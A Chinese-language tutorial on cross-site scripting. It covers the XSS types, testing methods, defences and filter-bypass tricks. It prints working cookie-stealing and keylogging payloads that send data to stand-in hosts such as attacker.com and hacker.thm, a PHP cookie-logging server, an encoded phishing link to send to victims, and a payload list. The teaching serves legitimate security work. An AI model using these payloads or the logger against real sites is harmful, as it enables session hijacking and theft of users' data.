## 概述

跨站脚本攻击（XSS）是一种安全漏洞，攻击者通过在网页中注入恶意的客户端脚本（通常是JavaScript），当其他用户浏览该网页时，恶意脚本会在用户的浏览器中执行。攻击者可以利用XSS窃取用户信息（如Cookie）、劫持用户会话、进行钓鱼欺诈或执行其他恶意操作。通常需要构造代码来闭合原有的HTML标签，以便插入并执行脚本。

**示例 Payload:**

*   `<p>一些内容 123</p><script>window.location.href="http://malicious.com/?cookie="+document.cookie</script>` (闭合 `<p>` 标签后执行脚本)

## XSS 分类

主要分为以下三类：

### 1. 反射型 XSS (Reflected XSS)

*   **概述:** 最常见的类型。恶意脚本作为URL参数提交给服务器，服务器未经验证或充分编码，直接将脚本“反射”回用户的浏览器并在当前页面执行。
*   **流程:** 用户点击恶意链接 -> 服务器处理请求（包含恶意参数）-> 服务器响应将恶意代码嵌入HTML -> 用户浏览器执行恶意代码。
*   **特点:**
    *   非持久性，攻击代码不存储在服务器上。
    *   需要诱骗用户点击特制的URL。
    *   影响范围通常限于点击链接的用户。
*   **常见位置:** 搜索结果页、错误提示页、URL参数直接输出到页面的地方。

### 2. 存储型 XSS (Stored/Persistent XSS)

*   **概述:** 攻击者将恶意脚本提交并存储到目标服务器的数据库或文件中（如留言板、评论区、用户资料）。当其他用户访问包含这些存储数据的页面时，服务器将恶意脚本取出并发送给用户的浏览器执行。
*   **流程:** 攻击者提交含恶意脚本的数据 -> 服务器存储数据 -> 其他用户访问页面 -> 服务器从存储中读取含脚本的数据并发送给用户 -> 用户浏览器执行恶意代码。
*   **特点:**
    *   持久性，攻击代码存储在服务器端。
    *   危害性大，可影响所有访问该页面的用户。
    *   可能导致XSS蠕虫，在用户间传播。
*   **常见位置:** 论坛帖子、文章评论、用户留言、个人资料、私信等用户生成内容（UGC）的功能。

### 3. DOM 型 XSS (DOM-based XSS)

*   **概述:** 漏洞存在于客户端脚本（JavaScript）处理逻辑中。恶意代码不经过服务器，而是由浏览器端的JavaScript在修改DOM（文档对象模型）时直接从URL、`#`片段或其他DOM来源获取并执行。
*   **流程:** 用户点击恶意链接 (如 `http://site.com/page#<script>alert(1)</script>`) -> 浏览器加载页面 -> 页面中的合法JavaScript获取URL片段或参数 -> JavaScript未充分处理就将其写入DOM (如 `innerHTML`) -> 导致恶意脚本执行。
*   **特点:**
    *   攻击载荷可能不发送到服务器，难以被服务端检测。
    *   漏洞源于前端代码，防御主要靠前端安全实践。
    *   与反射型类似，通常需要用户点击恶意链接。
*   **绕过技巧:** HTML不区分大小写，可对URL和参数进行各种编码（如 `escape`, `encodeURI`, `encodeURIComponent`, 十六进制, 十进制, 八进制）尝试绕过过滤。

## XSS 攻击方式与目的

### 1. 常用攻击手段和目的

*   **盗用Cookie:** 获取用户的Session Cookie，冒充用户身份登录或操作。(`document.cookie`)
*   **会话劫持:** 通过盗取的Cookie维持或恢复用户会话。
*   **钓鱼欺诈:** 插入伪造的登录框或将用户重定向到钓鱼网站。
*   **获取敏感信息:** 监听键盘输入 (`addEventListener('keypress', ...)`), 获取表单内容。
*   **执行未授权操作:** 以用户身份执行发帖、转账、修改设置、加好友等操作 (通过 `iframe`, `XMLHttpRequest`)。
*   **传播恶意软件/蠕虫:** 诱导用户下载或在用户间传播XSS payload。
*   **DDoS攻击:** 利用大量被XSS攻击的浏览器向目标网站发起请求。
*   **获取高权限:** 结合Flash/Java Applet的 `crossdomain.xml` 配置不当，可能实现跨域操作。
*   **内网探测:** 利用用户的浏览器作为跳板，扫描或攻击其内网环境。

### 2. XSS之存储型 (详细步骤)

1.  攻击者在网站功能（如评论区）提交包含恶意JavaScript代码的内容。
2.  网站后端未充分过滤或编码，将恶意代码存储到数据库中。
3.  其他用户访问包含该评论的页面。
4.  网站后端从数据库取出包含恶意代码的评论，并将其嵌入到HTML响应中发送给用户浏览器。
5.  用户浏览器解析HTML，并执行其中的恶意JavaScript代码。

### 3. XSS之反射型 (详细步骤)

1.  攻击者构造一个包含恶意JavaScript代码的URL (e.g., `http://site.com/search?q=<script>alert('XSS')</script>`)。
2.  攻击者通过邮件、社交媒体等方式诱骗用户点击该URL。
3.  用户点击URL后，浏览器向服务器发送请求，URL中的恶意代码作为参数传递。
4.  服务器后端从URL参数中获取数据，未充分过滤或编码，直接将其嵌入到HTML响应中。
5.  用户浏览器接收到响应，解析HTML并执行其中的恶意JavaScript代码。

### 4. XSS之DOM型 (详细步骤)

1.  攻击者构造一个特殊的URL，恶意代码通常在URL的`#`片段（fragment）或查询参数中 (e.g., `http://site.com/page#<img src=x onerror=alert(1)>`)。
2.  攻击者诱骗用户点击该URL。
3.  用户浏览器加载页面 `http://site.com/page`。
4.  页面中的客户端JavaScript代码执行，它可能会读取URL的片段 (`location.hash`) 或参数 (`location.search`)。
5.  如果该JavaScript代码没有正确处理（如直接使用 `innerHTML = location.hash.substring(1)`），就将恶意代码写入DOM。
6.  浏览器在修改DOM时执行了嵌入的恶意脚本。

## XSS 测试与工具

### 工具扫描

*   **商业扫描器:** AppScan, Acunetix (AWVS), Burp Suite Pro Scanner
*   **开源/专用工具:** XSStrike, XSSer, Dalfox

### 手动测试

*   **工具辅助:** Burp Suite (Repeater, Intruder), Firefox 浏览器插件 (如 FoxyProxy, Hackbar [旧版])
*   **测试步骤:**
    1.  **识别输入点:** 寻找所有用户可控的输入位置（URL参数、表单字段、HTTP头、搜索框、留言板等）。
    2.  **注入探测字符:** 输入包含特殊字符（如 `<>'"()&;`）和唯一标识符（如 `XXSTEST`）的字符串。
    3.  **检查源码输出:** 提交后，查看页面HTML源码，搜索唯一标识符，观察特殊字符是否被过滤、转义或原样输出。
    4.  **分析上下文:** 确定输出位置在HTML中的上下文（HTML标签内、标签属性内、JavaScript代码内、CSS内等）。
    5.  **构造Payload:** 根据上下文构造相应的闭合语句和XSS Payload。
        *   **HTML标签内容:** `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`
        *   **HTML属性值:** `"><script>alert(1)</script>`, `' onmouseover='alert(1)`
        *   **JavaScript变量:** `';alert(1);//`, `</script><script>alert(1)</script>`
    6.  **验证执行:** 提交构造好的Payload，观察浏览器是否执行了脚本（如弹出警告框）。

### 手动测试技巧

*   **输出位置未知:** 如果无法直接看到输出（如后台审核），可以尝试将信息外带（如 `new Image().src="http://attacker.com/?c="+document.cookie`）。
*   **万能Payload尝试 (不保证成功):** `"/></textarea>'"><img src=x onerror=alert(1)>` (尝试闭合多种标签)
*   **常用弹窗函数:**
    *   `alert()`: 弹出警告框，最常用作PoC (Proof of Concept)。
    *   `prompt()`: 弹出输入框。
    *   `confirm()`: 弹出确认框。
*   **可能存在XSS的地方:** 任何用户输入被输出到页面的地方，包括HTML正文、HTML元素属性、超链接(`href`, `src`)、事件处理器(`onclick`, `onerror`等)、CSS样式 (`style`属性, `<style>`标签)、JavaScript代码块内。

## XSS 实战示例

### 1. 存储型 XSS

*   **原理:** 恶意代码存入数据库，影响后续访问者。
*   **场景:** 留言板、评论区、用户资料。
*   **测试:** 在输入框提交 `<img src=x onerror=alert('StoredXSS')>`。保存后，重新访问或让其他用户访问该页面，看是否弹窗。
*   **修复:** 后端对用户输入进行严格过滤（移除危险标签/属性）或充分HTML实体编码后再存储或输出。

### 2. 反射型 XSS

*   **原理:** 恶意代码在URL中，服务器反射给当前用户。
*   **场景:** 搜索框、URL参数控制页面内容。
*   **测试:**
    1.  在搜索框输入唯一标识符（如 `TESTXSS`），提交搜索。
    2.  查看URL (`.../search?q=TESTXSS`) 和页面源码，找到 `TESTXSS` 的输出位置。
    3.  **例1 (输出在 `<title>`):** `<title>Search results for TESTXSS</title>`
        *   构造URL: `.../search?q=TESTXSS</title><script>alert(1)</script>`
    4.  **例2 (输出在 `<input>` value):** `<input type="text" name="q" value="TESTXSS">`
        *   构造URL: `.../search?q=TESTXSS"><script>alert(1)</script>`
    5.  将构造好的恶意URL发送给目标用户。
*   **修复:** 后端对从URL参数获取并要输出到页面的内容进行HTML实体编码。

### 3. DOM 型 XSS

*   **原理:** 浏览器端JavaScript处理不当导致。
*   **场景:** 页面内使用JavaScript动态修改内容，数据源来自 `location.hash`, `location.search` 等。
*   **测试:** 查找页面JavaScript代码中使用 `innerHTML`, `outerHTML`, `document.write` 等的地方，看其数据来源是否可控且未编码。
    *   例如，如果代码是 `document.getElementById('content').innerHTML = location.hash.substring(1);`
    *   构造URL: `http://site.com/page#<img src=x onerror=alert('DOMXSS')>`
*   **修复:** 前端JavaScript在将数据写入DOM前，进行安全的编码或过滤。避免使用 `innerHTML` 等危险方法处理不可信数据，优先使用 `textContent` 或安全的DOM操作方法。

### 反射型XSS获取用户Cookie信息 (示例)

**目标:** 利用反射型XSS漏洞，窃取用户访问 `http://目标URL` 时的Cookie，并发送到攻击者的服务器 `http://恶意URL`。

1.  **创建攻击者服务器页面 (e.g., `logger.php` on `http://恶意URL`)**:
    ```php
    <?php
    if(isset($_GET['cookie'])) {
        $time = date('Y-m-d H:i:s');
        // 修正: 使用 $_SERVER 获取 IP
        $ipaddress = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
        $cookie = $_GET['cookie'];
        // 修正: 使用 $_SERVER 获取 Referer 和 User-Agent
        $referer = $_SERVER['HTTP_REFERER'] ?? 'UNKNOWN';
        $useragent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';

        // 将获取到的信息记录到文件或数据库
        $log_message = "Time: $time | IP: $ipaddress | Referer: $referer | UserAgent: $useragent | Cookie: $cookie\n";
        file_put_contents('cookies.log', $log_message, FILE_APPEND);

        // (可选) 可以重定向回原始网站，让用户不易察觉
        // header("Location: http://目标URL");
        // exit();
        echo "Logged."; // 或者给个简单响应
    } else {
        echo "No cookie received.";
    }
    ?>
    ```

2.  **构造恶意URL (针对目标网站的反射点)**:
    假设目标网站搜索功能存在反射型XSS，URL为 `http://目标URL/search?query=`，并且 `query` 参数未过滤直接输出。
    构造的恶意 `query` 参数 payload:
    ```html
    <script>document.location='http://恶意URL/logger.php?cookie='+encodeURIComponent(document.cookie);</script>
    ```
    完整的恶意URL:
    ```
    http://目标URL/search?query=%3Cscript%3Edocument.location%3D%27http%3A%2F%2F%E6%81%B6%E6%84%8FURL%2Flogger.php%3Fcookie%3D%27%2BencodeURIComponent(document.cookie)%3B%3C%2Fscript%3E
    ```
    (注意 `恶意URL` 需要替换成真实的攻击者服务器地址，并对 payload 进行 URL 编码)

3.  **诱骗用户点击:** 将上述构造好的恶意URL发送给目标用户。用户点击后，浏览器会执行脚本，将Cookie发送到攻击者的 `logger.php`。

*   **Pikachu靶场类似场景:** Pikachu靶场的管理后台可以收集通过特定payload发送过来的Cookie信息。

## XSS 防御策略

核心思想：**永远不信任用户的输入，对输入进行过滤，对输出进行编码。**

1.  **输入过滤 (Input Filtering/Validation):**
    *   在接收用户输入时，进行严格的格式、类型、长度验证。
    *   使用白名单策略，只允许已知的安全字符和格式通过（如邮箱、电话号码格式验证）。
    *   移除或替换危险字符/标签（如 `<script>`, `onerror`）。
    *   **注意:** 前后端都需要进行验证，不能仅依赖前端验证。

2.  **输出编码 (Output Encoding):**
    *   **最关键的防御手段。** 根据数据输出的上下文（HTML内容、HTML属性、JavaScript、CSS、URL）进行相应的编码。
    *   **HTML实体编码:** 对输出到HTML标签内容或属性中的特殊字符（如 `< > " ' &`）进行编码。
        *   PHP: `htmlspecialchars()` (推荐设置 `ENT_QUOTES | ENT_HTML5` 标志), `htmlentities()`。
        *   Java: OWASP ESAPI `encodeForHTML()`, `encodeForHTMLAttribute()`.
        *   Python (Jinja2/Django): 默认自动转义。
    *   **JavaScript编码:** 对输出到JavaScript代码块或事件处理器中的数据进行编码（如 `\'`, `\"`, `\xHH`）。
    *   **CSS编码:** 对输出到 `<style>` 标签或 `style` 属性中的数据进行编码。
    *   **URL编码:** 对输出到URL参数或路径中的数据进行编码 (`encodeURIComponent()` in JS, `urlencode()` in PHP).

3.  **设置 `HttpOnly` Cookie 标志:**
    *   防止客户端JavaScript通过 `document.cookie` 读取敏感Cookie（如Session ID）。服务器在设置Cookie时添加 `HttpOnly` 标志。

4.  **内容安全策略 (Content Security Policy - CSP):**
    *   通过HTTP头 (`Content-Security-Policy`) 定义浏览器可以加载和执行资源的策略（如限制脚本来源、禁止内联脚本和 `eval`）。可以有效缓解XSS攻击。

5.  **使用安全的框架和库:**
    *   现代Web框架（如React, Angular, Vue, Django, Rails）通常内置了XSS防护机制（如自动HTML编码）。正确使用框架是重要的防御措施。

6.  **富文本处理 (Whitelist Filtering):**
    *   如果需要允许用户输入部分HTML（富文本编辑器），不能简单编码。应使用强大的HTML过滤库（如 `DOMPurify` [JS], `HTML Purifier` [PHP]），基于白名单过滤掉所有危险的标签和属性。

## XSS 绕过技巧

当目标网站存在基础防御时，攻击者可能尝试以下方法绕过：

1.  **前端长度限制:**
    *   **绕过:** 使用代理工具（如 Burp Suite）抓包修改请求，移除或增大 `maxlength` 限制。
2.  **关键字过滤/替换:**
    *   **大小写混合:** `<ScRiPt>alert(1)</sCrIpT>`
    *   **双写/拼凑:** `<scr<script>ipt>alert(1)</scr<script>ipt>` (如果只替换一次)
    *   **使用注释干扰:** `<scr<!-- comment -->ipt>alert(1)</script>` (可能干扰简单正则)
    *   **编码绕过:**
        *   URL 编码: `%3Cscript%3Ealert(1)%3C/script%3E`
        *   HTML 实体编码 (十进制/十六进制): `<img src=x onerror="alert(1)">` (`alert(1)`)
        *   JavaScript Unicode 编码: `javascript:\u0061\u006c\u0065\u0072\u0074(1)` (`alert`)
        *   混合/多次编码: 结合多种编码方式。
    *   **Tab/换行符等空白字符:** `<script	>alert(1)</script>`
3.  **`htmlspecialchars` 绕过:**
    *   **默认不转义单引号:** 如果输出在单引号包裹的属性中，如 `value='...'`，可注入 `q' onclick='alert(1)'` 变为 `value='q' onclick='alert(1)'`。
    *   **利用事件处理器:** ` ' onmouseover=alert(1) `
4.  **输出在 `<a>` 标签 `href` 属性中:**
    *   **`javascript:` 伪协议:** `<a href="javascript:alert(1)">Click Me</a>` (现代浏览器多有防护)
    *   **数据URI:** `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">` (Base64编码的`<script>alert(1)</script>`)
5.  **输出在 JavaScript 代码中:**
    *   **闭合引号和语句:** 如果输出在JS字符串变量中 `var x = '...';`，注入 `';alert(1);//` 变为 `var x = '';alert(1);//';`。
    *   **闭合 `<script>` 标签:** 如果输出直接在 `<script>` 块内，注入 `</script><script>alert(1)</script>`。
6.  **标签绕过 (利用不同解析模式):**
    *   **`<svg>` 标签:** `<svg onload=alert(1)>` (SVG内允许脚本执行)
    *   **`<details>` 标签:** `<details open ontoggle=alert(1)>`
    *   **利用XML解析:** 在某些上下文中（如SVG内），HTML实体可能被解码执行。

### XSS 攻击 Payload 示例 (常见)

*   `<script>alert('XSS')</script>`
*   `<img src=x onerror=alert('XSS')>`
*   `<svg onload=alert('XSS')>`
*   `<body onload=alert('XSS')>` (如果能控制body标签)
*   `<iframe src="javascript:alert('XSS');"></iframe>`
*   `<a href="javascript:alert('XSS')">Click Me</a>`
*   `<div onmouseover="alert('XSS')">Hover Me</div>`
*   `<video src=x onerror=alert('XSS')></video>`
*   `<audio src=x onerror=alert('XSS')></audio>`
*   `<details open ontoggle=alert('XSS')>`
*   `<style onload=alert('XSS')></style>` (旧浏览器/特定场景)
*   `<object data="javascript:alert('XSS')"></object>`
*   `<embed src="javascript:alert('XSS')"></embed>`
*   `<form action="javascript:alert('XSS')"><input type=submit></form>`
*   `<math><a xlink:href="javascript:alert('XSS')">Click</a></math>`
*   `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
*   `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
*   `<script>user.changeEmail('attacker@hacker.thm');</script>`
*   ```jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e```